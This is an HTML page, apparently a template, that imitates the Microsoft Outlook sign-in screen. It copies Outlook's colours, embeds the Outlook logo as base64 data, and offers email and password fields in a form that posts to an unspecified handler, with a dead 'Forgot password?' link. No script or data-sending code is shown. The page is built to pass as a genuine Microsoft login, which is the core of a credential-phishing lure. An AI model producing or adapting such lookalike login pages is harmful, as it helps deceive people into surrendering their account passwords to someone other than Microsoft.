# Outlook-Login<
!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	<title>Outlook Login</title>
	<style type="text/css">body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 40px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            text-align: center;
            width: 350px;
        }
        .logo {
            width: 200px; /* Adjust width as needed */
            margin-bottom: 20px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .login-btn {
            background-color: #0078D4;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 10px;
        }
        .login-btn:hover {
            background-color: #005A9E;
        }
        .forgot-password {
            margin-top: 15px;
            font-size: 14px;
        }
        .forgot-password a {
            color: #0078D4;
            text-decoration: none;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
	</style>
</head>
<body>
<div class="login-container"><!-- Placeholder for your Outlook logo --><img alt="Outlook Logo" class="logo" src="data:image/png;base64,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"/>
<form action="" method="POST"><input class="input-field" placeholder="Email Address" required="" type="email"/> <input class="input-field" name="password" placeholder="Password" required="" type="password"/><button class="login-btn" type="submit">Sign in</button></form>

<div class="forgot-password"><a href="#">Forgot password?</a></div>
</div>


</body></html>
